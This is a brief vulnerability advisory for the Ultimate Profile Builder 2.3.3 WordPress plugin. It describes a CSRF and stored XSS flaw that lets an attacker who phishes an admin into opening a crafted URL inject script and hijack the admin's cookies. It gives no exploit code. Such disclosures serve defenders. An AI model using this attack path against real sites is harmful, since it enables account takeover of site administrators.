title=CSRF and Stored XSS Vulnerability in Ultimate Profile Builder 2.3.3 Wordpress Plugin 
description:This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin's browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc.
